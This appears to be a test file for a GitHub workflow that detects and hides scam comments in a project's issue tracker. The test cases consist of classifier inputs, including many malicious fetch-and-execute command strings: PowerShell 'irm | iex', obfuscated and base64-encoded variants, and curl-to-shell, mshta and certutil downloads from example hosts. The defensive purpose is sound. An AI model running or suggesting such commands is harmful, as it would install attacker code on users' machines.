// Run with: node --test .github/scripts/scam-guard.test.mjs
//
// The hosts in these cases are reserved example names (RFC 2606) or made up,
// and none of the commands is ever executed: they are strings to classify.

import assert from "node:assert/strict";
import { test } from "node:test";

import { detect, isOwnTarget, redact, REDACTED_LINE } from "./scam-detect.mjs";
import { explanation, LABEL, run, subject } from "./scam-guard.mjs";

const verdict = (text) => detect(text).verdict;

test("own hosts: mirli.app and the HamSanders account, nothing that only looks like them", () => {
  for (const own of [
    "https://mirli.app/download/",
    "https://www.mirli.app/install.ps1",
    "mirli.app/install.sh",
    "https://github.com/HamSanders/soundbox/releases/download/v0.6.2/Soundbox_0.6.2_x64-setup.exe",
    "https://github.com/hamsanders/soundbox",
    "https://raw.githubusercontent.com/HamSanders/soundbox/main/scripts/x.sh",
    "http://127.0.0.1:17494/api/health",
    "http://localhost:17494/api/health",
  ]) {
    assert.equal(isOwnTarget(own), true, own);
  }
  for (const foreign of [
    "https://mirli.app.example.com/download",
    "https://notmirli.app/x",
    "https://github.com/HamSanders-fix/soundbox/releases/download/v1/setup.exe",
    "https://github.com/someone/soundbox/releases/download/v1/setup.exe",
    "https://github.com.example.net/HamSanders/soundbox",
    "https://github.com/HamSanders@example.com/x.ps1",
    "https://mirli.app@example.com/x.ps1",
    // Anyone can attach a file to an issue; that does not make it ours.
    "https://github.com/HamSanders/soundbox/files/123456/fix.zip",
    "https://github.com/user-attachments/files/123456/fix.zip",
    "https://gist.github.com/HamSanders/abc",
    "not a url at all",
  ]) {
    assert.equal(isOwnTarget(foreign), false, foreign);
  }
});

test("hide: PowerShell download-and-run from a foreign host", () => {
  for (const text of [
    "irm https://example.com/fix.ps1 | iex",
    "Try this, it fixed it for me:\n\n```powershell\nirm example.com/fix | iex\n```",
    "iwr -useb https://example.net/a.ps1 | Invoke-Expression",
    "iex (irm get.example.org)",
    "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')",
    "powershell -w hidden -c \"iex (iwr 'https://example.com/a')\"",
    "Invoke-Expression (Invoke-RestMethod https://example.com/a)",
    "i`r`m https://example.com/a | i`e`x",
    "irm https://github.com/HamSanders-fix/soundbox/raw/main/fix.ps1 | iex",
    "irm https://github.com/HamSanders/soundbox/files/99/fix.ps1 | iex",
  ]) {
    assert.equal(verdict(text), "hide", text);
  }
});

test("hide: pipe to a shell from a foreign host", () => {
  for (const text of [
    "curl -fsSL https://example.com/install.sh | sh",
    "curl https://example.com/i | sudo bash",
    "wget -qO- example.com/install.sh | bash -s -- --yes",
    "bash <(curl -s https://example.com/install.sh)",
    "sh -c \"$(curl -fsSL https://example.com/install.sh)\"",
    "curl -s https://example.com/x.py | python3",
    "curl -s https://example.com/x.py | python3 -",
  ]) {
    assert.equal(verdict(text), "hide", text);
  }
});

test("hide: Windows programs that fetch and run, and encoded PowerShell", () => {
  for (const text of [
    "mshta https://example.com/a.hta",
    "msiexec /i https://example.com/fix.msi /qn",
    "certutil -urlcache -split -f https://example.com/a.exe a.exe",
    `powershell -NoP -W Hidden -enc ${"SQBFAFgAIAAoAEkAUgBNACAA".repeat(3)}`,
  ]) {
    assert.equal(verdict(text), "hide", text);
  }
});

test("hide: a download link that comes with an archive password", () => {
  assert.equal(
    verdict("Fixed build here https://files.example.com/Mirli_fix.zip\npassword: 2025"),
    "hide",
  );
});

test("label only: the pattern is there but no host can be read", () => {
  for (const text of [
    "$u = $env:THING\nirm $u | iex",
    "curl \"$URL\" | sh",
  ]) {
    assert.equal(verdict(text), "label", text);
  }
});

test("label only: a quoted command, as when someone warns about it", () => {
  assert.equal(verdict("Don't run this, it's malware:\n> irm https://example.com/fix.ps1 | iex"), "label");
});

test("label only: a bare link to a program on a foreign host", () => {
  for (const text of [
    "I installed ffmpeg from https://downloads.example.org/ffmpeg-setup.exe and MP3 export still fails",
    "See [the releases page](https://example.com/Mirli-Setup.exe).",
    "https://github.com/someone/soundbox-fix/releases/download/v1/Soundbox_fix.dmg",
  ]) {
    assert.equal(verdict(text), "label", text);
  }
});

test("clean: Mirli's own commands and links", () => {
  for (const text of [
    "curl http://127.0.0.1:17494/api/health",
    "curl http://127.0.0.1:17494/api/health | python -m json.tool",
    "curl -s http://localhost:17494/api/health | jq .",
    "irm https://mirli.app/install.ps1 | iex",
    "curl -fsSL https://mirli.app/install.sh | sh",
    "curl -fsSL https://raw.githubusercontent.com/HamSanders/soundbox/main/scripts/x.sh | bash",
    "I downloaded https://github.com/HamSanders/soundbox/releases/download/v0.6.2/Soundbox_0.6.2_x64-setup.exe",
    "certutil -hashfile Soundbox_0.6.2_x64-setup.exe SHA256",
    "Get-FileHash .\\Soundbox_0.6.2_x64-setup.exe -Algorithm SHA256",
    "sha256sum -c SHA256SUMS.txt --ignore-missing",
  ]) {
    assert.equal(verdict(text), "clean", text);
  }
});

test("clean: ordinary bug-report text", () => {
  for (const text of [
    "",
    "Generation fails with `audiocpp_cli exited with code 1` on a 3060. Log:\n```\n[server] POST /api/generate 500\n```",
    "npm install && npm run dev | tee out.log",
    "cat soundbox-17494.log | grep error",
    "curl -L -o model.gguf https://huggingface.co/some/repo/resolve/main/model.gguf",
    "wget https://example.com/notes.txt",
    "My password manager extension breaks the settings page.",
    "The model card is at https://huggingface.co/stabilityai/stable-audio-open-1.0 and the paper is https://arxiv.org/abs/2407.14358",
    "Docs: https://example.com/guide.html and a sample https://example.com/clip.wav",
    "It says e.g. `Net.WebClient` is not found when I run install.ps1 myself.",
    REDACTED_LINE,
  ]) {
    assert.equal(verdict(text), "clean", text);
  }
});

test("redact replaces only the lines that earned hide", () => {
  const text = "Hi, same problem here.\nirm https://example.com/fix.ps1 | iex\nThanks!";
  const out = redact(text, detect(text).findings);
  assert.equal(out, `Hi, same problem here.\n${REDACTED_LINE}\nThanks!`);
  assert.equal(verdict(out), "clean");

  const quoted = "> irm https://example.com/fix.ps1 | iex";
  assert.equal(redact(quoted, detect(quoted).findings), quoted);
});

// --- the runner, against a fake API ---------------------------------------

function fakeApi(failing = []) {
  const calls = [];
  const record = (name) => async (...args) => {
    calls.push([name, ...args]);
    if (failing.includes(name)) throw new Error("Resource not accessible by integration");
  };
  return {
    calls,
    names: () => calls.map((c) => c[0]),
    ensureLabel: record("ensureLabel"),
    addLabel: record("addLabel"),
    updateIssue: record("updateIssue"),
    comment: record("comment"),
    minimiseComment: record("minimiseComment"),
  };
}

const SCAM = "irm https://example.com/fix.ps1 | iex";
const quiet = () => {};

function commentEvent(body, over = {}) {
  return {
    action: "created",
    issue: { number: 7, labels: [], title: "Crash on start", user: { login: "reporter", type: "User" } },
    comment: {
      node_id: "IC_1",
      body,
      author_association: "NONE",
      user: { login: "helper", type: "User" },
      ...over,
    },
  };
}

function issueEvent(title, body, over = {}) {
  return {
    action: "opened",
    issue: { number: 9, labels: [], title, body, author_association: "NONE", user: { login: "someone", type: "User" }, ...over },
  };
}

test("subject: collaborators, the owner and bots are never checked", () => {
  for (const association of ["OWNER", "MEMBER", "COLLABORATOR"]) {
    assert.ok(subject(commentEvent(SCAM, { author_association: association })).skip, association);
  }
  assert.ok(subject(commentEvent(SCAM, { user: { login: "dependabot[bot]", type: "Bot" } })).skip);
  assert.ok(subject({ ...commentEvent(SCAM), action: "deleted" }).skip);
  for (const association of ["NONE", "CONTRIBUTOR", "FIRST_TIME_CONTRIBUTOR", "FIRST_TIMER"]) {
    assert.equal(subject(commentEvent(SCAM, { author_association: association })).kind, "comment", association);
  }
});

test("subject: a comment is judged by its own author, not the issue's", () => {
  const event = commentEvent(SCAM);
  event.issue.author_association = "OWNER";
  assert.equal(subject(event).kind, "comment");
});

test("run: a scam comment is labelled, minimised and explained", async () => {
  const api = fakeApi();
  const result = await run(commentEvent(SCAM), api, quiet);
  assert.equal(result.verdict, "hide");
  assert.deepEqual(api.names(), ["ensureLabel", "addLabel", "minimiseComment", "comment"]);
  assert.deepEqual(api.calls[2], ["minimiseComment", "IC_1"]);
  assert.deepEqual(api.calls[3], ["comment", 7, explanation("comment")]);
});

test("run: a scam issue has its lines and title redacted, not the rest", async () => {
  const api = fakeApi();
  const result = await run(issueEvent(`fix: ${SCAM}`, `Hello\n${SCAM}\nBye`), api, quiet);
  assert.equal(result.verdict, "hide");
  assert.deepEqual(api.names(), ["ensureLabel", "addLabel", "updateIssue", "comment"]);
  assert.deepEqual(api.calls[2], [
    "updateIssue",
    9,
    { body: `Hello\n${REDACTED_LINE}\nBye`, title: "[Title removed by the scam guard]" },
  ]);
});

test("run: an issue whose body alone is bad keeps its title", async () => {
  const api = fakeApi();
  await run(issueEvent("Crash on start", SCAM), api, quiet);
  assert.deepEqual(api.calls[2], ["updateIssue", 9, { body: REDACTED_LINE }]);
});

test("run: an uncertain match is labelled and nothing else", async () => {
  const api = fakeApi();
  const result = await run(commentEvent("ffmpeg from https://downloads.example.org/ffmpeg.exe"), api, quiet);
  assert.equal(result.verdict, "label");
  assert.deepEqual(api.names(), ["ensureLabel", "addLabel"]);
});

test("run: clean text and trusted authors cause no API call", async () => {
  for (const event of [
    commentEvent("Same here on Windows 11."),
    commentEvent(SCAM, { author_association: "OWNER" }),
    issueEvent("Crash", "curl http://127.0.0.1:17494/api/health"),
  ]) {
    const api = fakeApi();
    await run(event, api, quiet);
    assert.deepEqual(api.calls, []);
  }
});

test("run: a thread that already has the label gets no second explanation", async () => {
  const api = fakeApi();
  const event = commentEvent(SCAM);
  event.issue.labels = [{ name: LABEL }];
  await run(event, api, quiet);
  assert.deepEqual(api.names(), ["minimiseComment"]);
});

test("run: one failing call does not stop the others, and is reported", async () => {
  const api = fakeApi(["minimiseComment"]);
  const result = await run(commentEvent(SCAM), api, quiet);
  assert.deepEqual(result.actions, ["label", "explain"]);
  assert.equal(result.failures.length, 1);
});

test("the explanation itself is clean, so the guard never flags its own words", () => {
  assert.equal(verdict(explanation("comment")), "clean");
  assert.equal(verdict(explanation("issue")), "clean");
});
